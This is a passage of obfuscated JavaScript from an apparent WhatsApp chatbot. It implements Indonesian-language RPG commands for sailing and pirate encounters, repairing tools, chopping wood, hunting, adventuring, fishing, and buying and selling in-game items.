              _0xf0066("Menyiapkan Perbekalan...", "Melepaskan Tali Kapal...", "Kapal Mulai Berlayar Menjauhi Pelabuhan...");
              let _0x1e1668 = ['kargo', "pesiar", 'nelayan', 'perang', "tanker", "kontainer", 'feri'];
              let _0x2bc824 = [0xe, 0x44, 0x40, 0x2c, 0x18, 0x6, 0x8, 0x30, 0x20, 0x12, 0xa, 0x16, 0x6, 0x2a, 0xc];
              let _0x39b686 = await _0x1e1668[Math.floor(Math.random() * _0x1e1668.length)];
              let _0x5ca3fa = await _0x2bc824[Math.floor(Math.random() * _0x2bc824.length)];
              db.data.rpg[_0x3f87c6.sender].wilayah = _0x143458[0x0];
              await sleep(0x2710);
              let _0x2109a9 = "Ditengah perjalanan ke\n" + _0x143458[0x0] + " Kamu bertemu\ndengan kapal *" + _0x39b686 + "*\nyang memiliki kru dengan\njumlah *" + _0x5ca3fa + " orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*";
              let _0x4c803e = [{
                'name': "quick_reply",
                'buttonParamsJson': "{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}"
              }, {
                'name': "quick_reply",
                'buttonParamsJson': "{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}"
              }];
              pirates[_0x3f87c6.sender] = [await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x4c803e, "*PIRATE BATTLE 🏴‍☠️*\n", _0x2109a9, footer, _0x3f87c6), _0x39b686, _0x5ca3fa, _0x143458[0x0], setTimeout(() => {
                if (pirates[_0x3f87c6.sender]) {
                  db.data.rpg[_0x3f87c6.sender].darahkapal = 0x0;
                  _0x3a091f("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*");
                  delete pirates[_0x3f87c6.sender];
                }
              }, 0x1d4c0)];
            } else {
              if (_0x143458[0x0] === "brazil") {
                _0xf0066("Menyiapkan Perbekalan...", "Melepaskan Tali Kapal...", "Kapal Mulai Berlayar Menjauhi Pelabuhan...");
                let _0x10be49 = ['kargo', "pesiar", "nelayan", "perang", "tanker", 'kontainer', 'feri'];
                let _0x438e14 = [0xe, 0x44, 0x40, 0x2c, 0x18, 0x6, 0x8, 0x30, 0x20, 0x12, 0xa, 0x16, 0x6, 0x2a, 0xc];
                let _0xce5641 = await _0x10be49[Math.floor(Math.random() * _0x10be49.length)];
                let _0x1e676b = await _0x438e14[Math.floor(Math.random() * _0x438e14.length)];
                db.data.rpg[_0x3f87c6.sender].wilayah = _0x143458[0x0];
                await sleep(0x2710);
                let _0xdec699 = "Ditengah perjalanan ke\n" + _0x143458[0x0] + " Kamu bertemu\ndengan kapal *" + _0xce5641 + "*\nyang memiliki kru dengan\njumlah *" + _0x1e676b + " orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*";
                let _0x226d2a = [{
                  'name': "quick_reply",
                  'buttonParamsJson': "{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}"
                }, {
                  'name': 'quick_reply',
                  'buttonParamsJson': "{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}"
                }];
                pirates[_0x3f87c6.sender] = [await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x226d2a, "*PIRATE BATTLE 🏴‍☠️*\n", _0xdec699, footer, _0x3f87c6), _0xce5641, _0x1e676b, _0x143458[0x0], setTimeout(() => {
                  if (pirates[_0x3f87c6.sender]) {
                    db.data.rpg[_0x3f87c6.sender].darahkapal = 0x0;
                    _0x3a091f("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*");
                    delete pirates[_0x3f87c6.sender];
                  }
                }, 0x1d4c0)];
              } else {
                if (_0x143458[0x0] === 'rusia') {
                  _0xf0066("Menyiapkan Perbekalan...", "Melepaskan Tali Kapal...", "Kapal Mulai Berlayar Menjauhi Pelabuhan...");
                  let _0x397d4b = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"];
                  let _0x578924 = [0xe, 0x44, 0x40, 0x2c, 0x18, 0x6, 0x8, 0x30, 0x20, 0x12, 0xa, 0x16, 0x6, 0x2a, 0xc];
                  let _0x421b81 = await _0x397d4b[Math.floor(Math.random() * _0x397d4b.length)];
                  let _0x185de3 = await _0x578924[Math.floor(Math.random() * _0x578924.length)];
                  db.data.rpg[_0x3f87c6.sender].wilayah = _0x143458[0x0];
                  await sleep(0x2710);
                  let _0x5f51dd = "Ditengah perjalanan ke\n" + _0x143458[0x0] + " Kamu bertemu\ndengan kapal *" + _0x421b81 + "*\nyang memiliki kru dengan\njumlah *" + _0x185de3 + " orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*";
                  let _0x1fc746 = [{
                    'name': 'quick_reply',
                    'buttonParamsJson': "{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}"
                  }, {
                    'name': 'quick_reply',
                    'buttonParamsJson': "{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}"
                  }];
                  pirates[_0x3f87c6.sender] = [await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x1fc746, "*PIRATE BATTLE 🏴‍☠️*\n", _0x5f51dd, footer, _0x3f87c6), _0x421b81, _0x185de3, _0x143458[0x0], setTimeout(() => {
                    if (pirates[_0x3f87c6.sender]) {
                      db.data.rpg[_0x3f87c6.sender].darahkapal = 0x0;
                      _0x3a091f("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*");
                      delete pirates[_0x3f87c6.sender];
                    }
                  }, 0x1d4c0)];
                } else {
                  if (_0x143458[0x0] === "australia") {
                    _0xf0066("Menyiapkan Perbekalan...", "Melepaskan Tali Kapal...", "Kapal Mulai Berlayar Menjauhi Pelabuhan...");
                    let _0x5870b3 = ['kargo', 'pesiar', "nelayan", "perang", 'tanker', 'kontainer', 'feri'];
                    let _0x66b08 = [0xe, 0x44, 0x40, 0x2c, 0x18, 0x6, 0x8, 0x30, 0x20, 0x12, 0xa, 0x16, 0x6, 0x2a, 0xc];
                    let _0x19af06 = await _0x5870b3[Math.floor(Math.random() * _0x5870b3.length)];
                    let _0x174e5e = await _0x66b08[Math.floor(Math.random() * _0x66b08.length)];
                    db.data.rpg[_0x3f87c6.sender].wilayah = _0x143458[0x0];
                    await sleep(0x2710);
                    let _0x25e071 = "Ditengah perjalanan ke\n" + _0x143458[0x0] + " Kamu bertemu\ndengan kapal *" + _0x19af06 + "*\nyang memiliki kru dengan\njumlah *" + _0x174e5e + " orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*";
                    let _0x585d12 = [{
                      'name': "quick_reply",
                      'buttonParamsJson': "{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}"
                    }, {
                      'name': "quick_reply",
                      'buttonParamsJson': "{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}"
                    }];
                    pirates[_0x3f87c6.sender] = [await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x585d12, "*PIRATE BATTLE 🏴‍☠️*\n", _0x25e071, footer, _0x3f87c6), _0x19af06, _0x174e5e, _0x143458[0x0], setTimeout(() => {
                      if (pirates[_0x3f87c6.sender]) {
                        db.data.rpg[_0x3f87c6.sender].darahkapal = 0x0;
                        _0x3a091f("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*");
                        delete pirates[_0x3f87c6.sender];
                      }
                    }, 0x1d4c0)];
                  } else {
                    if (_0x143458[0x0] === "kanada") {
                      _0xf0066("Menyiapkan Perbekalan...", "Melepaskan Tali Kapal...", "Kapal Mulai Berlayar Menjauhi Pelabuhan...");
                      let _0x13fa1d = ["kargo", "pesiar", "nelayan", "perang", "tanker", "kontainer", "feri"];
                      let _0x1d9b00 = [0xe, 0x44, 0x40, 0x2c, 0x18, 0x6, 0x8, 0x30, 0x20, 0x12, 0xa, 0x16, 0x6, 0x2a, 0xc];
                      let _0x3430ab = await _0x13fa1d[Math.floor(Math.random() * _0x13fa1d.length)];
                      let _0xdcfa0f = await _0x1d9b00[Math.floor(Math.random() * _0x1d9b00.length)];
                      db.data.rpg[_0x3f87c6.sender].wilayah = _0x143458[0x0];
                      await sleep(0x2710);
                      let _0x3b1f60 = "Ditengah perjalanan ke\n" + _0x143458[0x0] + " Kamu bertemu\ndengan kapal *" + _0x3430ab + "*\nyang memiliki kru dengan\njumlah *" + _0xdcfa0f + " orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*";
                      let _0x3a5dc7 = [{
                        'name': "quick_reply",
                        'buttonParamsJson': "{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}"
                      }, {
                        'name': 'quick_reply',
                        'buttonParamsJson': "{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}"
                      }];
                      pirates[_0x3f87c6.sender] = [await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x3a5dc7, "*PIRATE BATTLE 🏴‍☠️*\n", _0x3b1f60, footer, _0x3f87c6), _0x3430ab, _0xdcfa0f, _0x143458[0x0], setTimeout(() => {
                        if (pirates[_0x3f87c6.sender]) {
                          db.data.rpg[_0x3f87c6.sender].darahkapal = 0x0;
                          _0x3a091f("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*");
                          delete pirates[_0x3f87c6.sender];
                        }
                      }, 0x1d4c0)];
                    } else {
                      if (_0x143458[0x0] === "greenland") {
                        _0xf0066("Menyiapkan Perbekalan...", "Melepaskan Tali Kapal...", "Kapal Mulai Berlayar Menjauhi Pelabuhan...");
                        let _0x550789 = ["kargo", 'pesiar', "nelayan", 'perang', "tanker", "kontainer", 'feri'];
                        let _0x295d6b = [0xe, 0x44, 0x40, 0x2c, 0x18, 0x6, 0x8, 0x30, 0x20, 0x12, 0xa, 0x16, 0x6, 0x2a, 0xc];
                        let _0x41d294 = await _0x550789[Math.floor(Math.random() * _0x550789.length)];
                        let _0x4688e7 = await _0x295d6b[Math.floor(Math.random() * _0x295d6b.length)];
                        db.data.rpg[_0x3f87c6.sender].wilayah = _0x143458[0x0];
                        await sleep(0x2710);
                        let _0x5737b = "Ditengah perjalanan ke\n" + _0x143458[0x0] + " Kamu bertemu\ndengan kapal *" + _0x41d294 + "*\nyang memiliki kru dengan\njumlah *" + _0x4688e7 + " orang*, sedangkan kru\nkapalmu berjumlah *38 orang*\n\n*Apakah Kamu Akan Melakukan*\n*Pembajakan Ke Kapal Tersebut?*";
                        let _0x1ba3ad = [{
                          'name': "quick_reply",
                          'buttonParamsJson': "{\"display_text\":\"Serang🏴‍☠️\",\"id\":\"serang\"}"
                        }, {
                          'name': 'quick_reply',
                          'buttonParamsJson': "{\"display_text\":\"Lewati Kapal🏳️\",\"id\":\".nyerah\"}"
                        }];
                        pirates[_0x3f87c6.sender] = [await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x1ba3ad, "*PIRATE BATTLE 🏴‍☠️*\n", _0x5737b, footer, _0x3f87c6), _0x41d294, _0x4688e7, _0x143458[0x0], setTimeout(() => {
                          if (pirates[_0x3f87c6.sender]) {
                            db.data.rpg[_0x3f87c6.sender].darahkapal = 0x0;
                            _0x3a091f("*Kamu telah terdeteksi perompak, kapal mu di bom tentara*");
                            delete pirates[_0x3f87c6.sender];
                          }
                        }, 0x1d4c0)];
                      } else {
                        let _0x337ba6 = '';
                        _0x337ba6 += "*Pilih Destinasi Berlayar!*\n\n";
                        _0x337ba6 += "🔵 indonesia\n";
                        _0x337ba6 += "🔴 kanada\n";
                        _0x337ba6 += "⚪ rusia\n";
                        _0x337ba6 += "⚫ india\n";
                        _0x337ba6 += "🟣 brazil\n";
                        _0x337ba6 += "🟠 australia\n";
                        _0x337ba6 += "🟢 greenland\n\n";
                        _0x337ba6 += "Contoh:\n" + (_0x4773c6 + _0x4ac520) + " rusia\n";
                        await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                          'text': _0x337ba6,
                          'contextInfo': {
                            'mentionedJid': [_0x3f87c6.sender],
                            'forwardingScore': 0x270f,
                            'isForwarded': true,
                            'forwardedNewsletterMessageInfo': {
                              'newsletterJid': saluran,
                              'serverMessageId': null,
                              'newsletterName': saluranName
                            },
                            'externalAdReply': {
                              'title': "PIRATE ADVENTURE",
                              'body': "Sail across the ocean and go on adventures",
                              'thumbnailUrl': "https://telegra.ph/file/4275a0a1fcf450835b0ef.jpg",
                              'sourceUrl': wagc,
                              'mediaType': 0x1,
                              'renderLargerThumbnail': true
                            }
                          }
                        }, {
                          'quoted': _0x3f87c6
                        });
                      }
                    }
                  }
                }
              }
            }
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'repair':
      case "rawat":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Kamu belum bergabung dalam RPG!*\n\nKetik: _.joinrpg_ untuk mulai petualanganmu!");
          }
          let _0xf8dde2 = _0x143458[0x0];
          let _0x212fd2 = {
            'kapal': {
              'nama': "Kapal",
              'syarat': {
                'besi': 0x5,
                'kayu': 0xa
              },
              'darah': "darahkapal"
            },
            'pickaxe': {
              'nama': "Pickaxe",
              'syarat': {
                'besi': 0x1
              },
              'darah': "darahpickaxe"
            },
            'kapak': {
              'nama': 'Kapak',
              'syarat': {
                'besi': 0x1
              },
              'darah': "darahkapak"
            },
            'armor': {
              'nama': "Baju Zirah",
              'syarat': {
                'besi': 0x2
              },
              'darah': "darahbzirah"
            },
            'pedang': {
              'nama': "Pedang",
              'syarat': {
                'besi': 0x1
              },
              'darah': "darahpedang"
            }
          };
          if (!_0x212fd2[_0xf8dde2]) {
            let _0xdabb05 = "-「 *PERBAIKAN ALAT* 」-\n\n";
            _0xdabb05 += "🔧 *Pilih item yang ingin diperbaiki:*\n";
            _0xdabb05 += " 🛶 Kapal\n ⛏️ Pickaxe\n 🪓 Kapak\n 🛡️ Armor\n ⚔️ Pedang\n\n";
            _0xdabb05 += "📌 *Contoh penggunaan:*\n " + (_0x4773c6 + _0x4ac520) + " kapak";
            return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0xdabb05,
              'contextInfo': {
                'mentionedJid': [_0x3f87c6.sender],
                'forwardingScore': 0x270f,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': saluran,
                  'serverMessageId': null,
                  'newsletterName': saluranName
                },
                'externalAdReply': {
                  'title': "🔧 RPG TOOLS REPAIR",
                  'body': "Memperbaiki alat dan persenjataan",
                  'thumbnailUrl': 'https://telegra.ph/file/08e78c20afd16dcebb33d.jpg',
                  'sourceUrl': wagc,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x3f87c6
            });
          }
          let _0x3cc740 = _0x212fd2[_0xf8dde2];
          if (!db.data.rpg[_0x3f87c6.sender][_0xf8dde2]) {
            return _0x3a091f("⚠️ *Kamu belum memiliki " + _0x3cc740.nama + "!*\nBuat dulu sebelum bisa diperbaiki.");
          }
          if (db.data.rpg[_0x3f87c6.sender][_0x3cc740.darah] >= 0x64) {
            return _0x3a091f("✅ *" + _0x3cc740.nama + " kamu masih dalam kondisi baik!*");
          }
          for (let [_0x1d101e, _0x44539f] of Object.entries(_0x3cc740.syarat)) {
            if (db.data.rpg[_0x3f87c6.sender][_0x1d101e] < _0x44539f) {
              return _0x3a091f("⚠️ *" + (_0x1d101e.charAt(0x0).toUpperCase() + _0x1d101e.slice(0x1)) + " kamu tidak cukup!*\n\nDiperlukan *" + _0x44539f + " " + _0x1d101e + "* untuk memperbaiki " + _0x3cc740.nama + '.');
            }
          }
          for (let [_0x5290c5, _0x5e8b6f] of Object.entries(_0x3cc740.syarat)) {
            db.data.rpg[_0x3f87c6.sender][_0x5290c5] -= _0x5e8b6f;
          }
          db.data.rpg[_0x3f87c6.sender][_0x3cc740.darah] = 0x64;
          _0xf0066("🔧 Memperbaiki, mohon tunggu...", "🎨 Tahap Finishing...", "✅ Perbaikan selesai!");
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "menebang":
      case "nebang":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Kamu belum bergabung dalam RPG!*\n\nKetik: _.joinrpg_ untuk mulai petualanganmu!");
          }
          if (!db.data.rpg[_0x3f87c6.sender].kapak) {
            return _0x3a091f("🪓 *Kamu tidak punya kapak!*\nBuat dulu dengan ketik: _.craft_");
          }
          if (db.data.rpg[_0x3f87c6.sender].darahkapak < 0x1) {
            return _0x3a091f("💔 *Kapakmu rusak!*\nRawat dulu sebelum digunakan lagi.\n\nKetik: _.rawat_");
          }
          let _0x1f818d = await _0x48bf64(0x5, 0x14);
          db.data.rpg[_0x3f87c6.sender].kayu += _0x1f818d;
          db.data.rpg[_0x3f87c6.sender].darahkapak -= 0x14;
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          let _0x1bb171 = "*🌲 MENEBANG POHON 🌲*\n\n";
          _0x1bb171 += "✅ *Hasil Tebangan:*\n";
          _0x1bb171 += " 🪵 Kayu: " + _0x1f818d + "\n";
          _0x1bb171 += " 🪓 Kapak: -20 daya tahan\n\n";
          _0x1bb171 += "Gunakan kayu untuk berbagai keperluan!";
          _0x3a091f(_0x1bb171);
          break;
        }
      case "berburu":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Kamu belum bergabung dalam RPG!*\n\nKetik: _.joinrpg_ untuk mulai petualanganmu!");
          }
          let _0x18b925 = new Date() - db.data.rpg[_0x3f87c6.sender].burutime;
          if (_0x18b925 < 0x6ddd00) {
            let _0x1b5f1e = await clockString(0x6ddd00 - _0x18b925);
            return _0x3a091f("⏳ *Kamu baru saja berburu!*\nTunggu " + _0x1b5f1e + " sebelum bisa berburu lagi.");
          }
          let _0x7c0696 = await _0x48bf64(0x1, 0xa);
          let _0x31982a = await _0x48bf64(0x1, 0xa);
          let _0x22103a = await _0x48bf64(0x1, 0xa);
          let _0x432e00 = Math.floor((_0x7c0696 + _0x31982a + _0x22103a) / 0x2);
          db.data.rpg[_0x3f87c6.sender].burutime = new Date() * 0x1;
          db.data.rpg[_0x3f87c6.sender].domba += _0x7c0696;
          db.data.rpg[_0x3f87c6.sender].sapi += _0x31982a;
          db.data.rpg[_0x3f87c6.sender].ayam += _0x22103a;
          db.data.rpg[_0x3f87c6.sender].bulu += _0x432e00;
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          let _0x10c8a0 = "*🏹 BERBURU HEWAN 🏹*\n\n";
          _0x10c8a0 += "✅ *Hasil Buruan:*\n";
          _0x10c8a0 += " 🐏 Domba: " + _0x7c0696 + "\n";
          _0x10c8a0 += " 🐄 Sapi: " + _0x31982a + "\n";
          _0x10c8a0 += " 🐔 Ayam: " + _0x22103a + "\n";
          _0x10c8a0 += " 🪶 Bulu: " + _0x432e00 + "\n\n";
          _0x10c8a0 += "_Tunggu 2 jam sebelum berburu lagi!_";
          _0x3a091f(_0x10c8a0);
          break;
        }
      case "adventure":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Kamu belum join RPG!*\n\nGabung dulu dengan ketik: _.joinrpg_");
          }
          if (db.data.rpg[_0x3f87c6.sender].darahuser < 0x1) {
            return _0x3a091f("💔 *Kamu terlalu lemah untuk berpetualang!*\n\nGunakan ramuan/makanan untuk sembuh.\nKetik: _.heal_");
          }
          let _0xedf18c = _0x143458.join(" ");
          let _0x63d86b = {
            'savanah': "https://telegra.ph/file/1b27b199f440cd69be0aa.jpg",
            'dessert': "https://telegra.ph/file/760e27568c0b2ccf07231.jpg",
            "boreal forest": "https://telegra.ph/file/1a528cf0c7e1eb0e74976.jpg",
            "tropical forest": "https://telegra.ph/file/bbc4d8eb053479d69e5f7.jpg"
          };
          if (!_0x63d86b[_0xedf18c]) {
            let _0x1b3897 = Object.keys(_0x63d86b).map(_0x3a5fb6 => "- " + _0x3a5fb6).join("\n");
            return _0x216f9b(_0x3f87c6.chat, "Pilih Lokasi Jelajahmu📍", _0x1b3897, "https://telegra.ph/file/6b9482a4ed6bd79c7a03e.jpg");
          }
          let _0x2a4adc = {
            'kayu': await _0x48bf64(0x5, 0xf),
            'besi': await _0x48bf64(0x3, 0xa),
            'rank': await _0x48bf64(0x32, 0x64),
            'saldo': await _0x48bf64(0x1f4, 0x7d0),
            'musuh': await ["Villager jahat", "Zombie", "Ghasts", "Wither", 'Skeleton', "Serigala buas"][Math.floor(Math.random() * ["Villager jahat", "Zombie", "Ghasts", "Wither", 'Skeleton', "Serigala buas"].length)]
          };
          db.data.rpg[_0x3f87c6.sender].darahuser -= 0x14;
          db.data.rpg[_0x3f87c6.sender].kayu += _0x2a4adc.kayu;
          db.data.rpg[_0x3f87c6.sender].besi += _0x2a4adc.besi;
          db.data.rpg[_0x3f87c6.sender].rank += _0x2a4adc.rank;
          db.data.rpg[_0x3f87c6.sender].uang += _0x2a4adc.saldo;
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          await _0x5ea5c2(_0x3f87c6.chat, _0xedf18c, _0x2a4adc, _0x63d86b[_0xedf18c]);
          break;
        }
      case "memancing":
      case 'mancing':
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Kamu belum join RPG!*\n\nGabung dulu dengan ketik: _.joinrpg_");
          }
          if (db.data.rpg[_0x3f87c6.sender].darahuser < 0x1) {
            return _0x3a091f("💔 *Kamu terlalu lemah untuk memancing!*\n\nGunakan ramuan/makanan untuk sembuh.\nKetik: _.heal_");
          }
          let _0x595fa9 = await _0x48bf64(0x0, 0x14);
          db.data.rpg[_0x3f87c6.sender].ikan += _0x595fa9;
          db.data.rpg[_0x3f87c6.sender].darahuser -= 0x14;
          let _0x499e4b = ["https://telegra.ph/file/9b1f618a826fe7b3bed3e.jpg", "https://telegra.ph/file/2e772e9732c88e153e812.jpg", "https://telegra.ph/file/872b36a0dd7b6843f24da.jpg", "https://telegra.ph/file/562adf3d43cde4d355e76.jpg", "https://telegra.ph/file/7d641d46e96e9aace01dd.jpg"];
          let _0xa3c695 = await _0x499e4b[Math.floor(Math.random() * _0x499e4b.length)];
          let {
            key: _0x528177
          } = await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': "🎣 *Sedang Memancing...*"
          }, {
            'quoted': _0x3f87c6
          });
          await sleep(0x1388);
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': "🐟 *Memperoleh Hasil...*",
            'edit': _0x528177
          });
          await sleep(0x1388);
          let _0x3db21a = "🎣 *MEMANCING* 🎣\n\n";
          _0x3db21a += "✅ Berhasil menangkap *" + _0x595fa9 + "* ikan!\n\n";
          _0x3db21a += "⚠️ *Stamina berkurang -20*\n";
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': _0x3db21a,
            'contextInfo': {
              'mentionedJid': [_0x3f87c6.sender],
              'forwardingScore': 0x270f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': saluran,
                'serverMessageId': null,
                'newsletterName': saluranName
              },
              'externalAdReply': {
                'title': "🎣 RPG - Fishing",
                'body': "Ayo cari ikan sebanyak-banyaknya!",
                'thumbnailUrl': _0xa3c695,
                'sourceUrl': wagc,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x3f87c6
          });
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
        }
        break;
      case "sell":
      case "jual":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("⚠️ *Kamu belum join RPG!*\n\nGabung dulu dengan ketik: _.joinrpg_");
          }
          let _0x2600ad = _0x143458[0x0];
          let _0x2a814b = Number(_0x143458[0x1]);
          if (!_0x2600ad) {
            return _0x3a091f("📢 *Pilih barang yang mau dijual!*\n\nContoh:\n" + (_0x4773c6 + _0x4ac520) + " emas 2");
          }
          if (!_0x143458[0x1] || isNaN(_0x2a814b)) {
            return _0x3a091f("⚠️ *Jumlah harus angka!*\n\nContoh:\n" + (_0x4773c6 + _0x4ac520) + " " + _0x2600ad + " 2");
          }
          let _0x2f184f = {
            'emas': 0x9c4,
            'besi': 0x5dc,
            'batubara': 0x3e8,
            'perak': 0x7d0,
            'kayu': 0x1f4,
            'ayam': 0x1f4,
            'sapi': 0xbb8,
            'domba': 0x7d0,
            'ikan': 0xc8
          };
          if (!_0x2f184f[_0x2600ad]) {
            let _0x59870a = "🛍️ *Toko Jual Barang* 🛍️\n\n";
            _0x59870a += "Pilih barang yang mau kamu jual:\n";
            _0x59870a += Object.keys(_0x2f184f).map(_0x26e3c0 => "- " + _0x26e3c0).join("\n") + "\n\n";
            _0x59870a += "📌 *Contoh jual barang:*\n" + (_0x4773c6 + _0x4ac520) + " emas 2";
            return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x59870a,
              'contextInfo': {
                'mentionedJid': [_0x3f87c6.sender],
                'forwardingScore': 0x270f,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': saluran,
                  'serverMessageId': null,
                  'newsletterName': saluranName
                },
                'externalAdReply': {
                  'title': "🛒 Toko Jual Barang",
                  'body': "Jual barang untuk dapatkan uang!",
                  'thumbnailUrl': "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
                  'sourceUrl': wagc,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x3f87c6
            });
          }
          if (db.data.rpg[_0x3f87c6.sender][_0x2600ad] < _0x2a814b) {
            return _0x3a091f("❌ *Kamu gak punya cukup " + _0x2600ad + '!*');
          }
          let _0x11c693 = _0x2a814b * _0x2f184f[_0x2600ad];
          db.data.users[_0x3f87c6.sender].uang += _0x11c693;
          db.data.rpg[_0x3f87c6.sender][_0x2600ad] -= _0x2a814b;
          let _0x519367 = "✅ *Transaksi Berhasil!*\n\n";
          _0x519367 += "📦 *Barang Terjual:*\n- " + (_0x2600ad.charAt(0x0).toUpperCase() + _0x2600ad.slice(0x1)) + ": " + _0x2a814b + "\n\n";
          _0x519367 += "💰 *Uang Didapat:*\n+ Rp " + _0x11c693.toLocaleString() + "\n\n";
          _0x519367 += "🏦 *Saldo Saat Ini:*\nRp " + db.data.users[_0x3f87c6.sender].uang.toLocaleString();
          _0x3a091f(_0x519367);
        }
        break;
      case "belanja":
      case "beli":
        {
          if (!db.data.users[_0x3f87c6.sender].rpg) {
            return _0x3a091f("*⚠️ Kamu belum bergabung dalam RPG!*\n\n📌 Ketik: _" + _0x4773c6 + "joinrpg_");
          }
          let _0x5d9579 = {
            'emas': 0x9c4,
            'besi': 0x5dc,
            'batubara': 0x3e8,
            'perak': 0x7d0,
            'kayu': 0x1f4,
            'ayam': 0x1f4,
            'sapi': 0xbb8,
            'domba': 0x7d0,
            'ikan': 0xc8
          };
          let _0x4ca7e3 = _0x143458[0x0]?.["toLowerCase"]();
          let _0x2bee24 = parseInt(_0x143458[0x1]);
          if (!_0x4ca7e3 || !_0x2bee24 || isNaN(_0x2bee24) || _0x2bee24 <= 0x0) {
            let _0x2bf3cd = Object.entries(_0x5d9579).map(([_0x69ac96, _0x2bcd75]) => "- " + _0x69ac96 + " (Rp " + _0x2bcd75 + '/unit)').join("\n");
            return _0x3a091f("🛍️ *MARKET - LIST HARGA* 🛍️\n\n" + _0x2bf3cd + "\n\n📌 Contoh: *" + _0x4773c6 + "beli emas 2*");
          }
          if (!_0x5d9579[_0x4ca7e3]) {
            return _0x3a091f("⚠️ Item tidak ditemukan! Ketik *" + _0x4773c6 + "beli* untuk melihat daftar harga.");
          }
          let _0x544d59 = _0x5d9579[_0x4ca7e3] * _0x2bee24;
          if (db.data.users[_0x3f87c6.sender].uang < _0x544d59) {
            return _0x3a091f("❌ *Saldo kamu tidak cukup!*\n💰 Harga: Rp " + _0x544d59 + "\n🔹 Saldo saat ini: Rp " + db.data.users[_0x3f87c6.sender].uang);
          }
          db.data.users[_0x3f87c6.sender].uang -= _0x544d59;
          db.data.rpg[_0x3f87c6.sender][_0x4ca7e3] = (db.data.rpg[_0x3f87c6.sender][_0x4ca7e3] || 0x0) + _0x2bee24;
          let _0x183520 = "🛍️ *MARKET - PEMBELIAN BERHASIL* 🛍️\n\n";
          _0x183520 += "📦 *Item Dibeli:* " + _0x4ca7e3 + " x" + _0x2bee24 + "\n";
          _0x183520 += "💰 *Total Bayar:* Rp " + _0x544d59 + "\n";
          _0x183520 += "💵 *Saldo Tersisa:* Rp " + db.data.users[_0x3f87c6.sender].uang + "\n";
          _0x3a091f(_0x183520);
        }
        break;
      case "bekerja":
      case 'kerja':
        {
          let _0x17382f = (_0x143458[0x0] || '').toLowerCase();
          let _0x1a985c = db.data.rpg[_0x3f87c6.sender].lastkerja || 0x0;
          let _0x4854fd = 0x927c0 - (new Date() - _0x1a985c);
          if (_0x4854fd > 0x0) {
            return _0x3a091f("⚠️ Kamu sudah bekerja!\n💤 Saatnya istirahat selama " + clockString(_0x4854fd) + " sebelum bekerja lagi.");
          }
          let _0x3f93be = {
            'ojek': {
              'action': "mengantarkan penumpang",
              'item': ["mas-mas", 'bapak-bapak', "cewe SMA", "bocil epep", "emak-emak"][Math.floor(Math.random() * ["mas-mas", 'bapak-bapak', "cewe SMA", "bocil epep", "emak-emak"].length)],
              'emoji': '🚗'
            },
            'pedagang': {
              'action': "menjual dagangan",
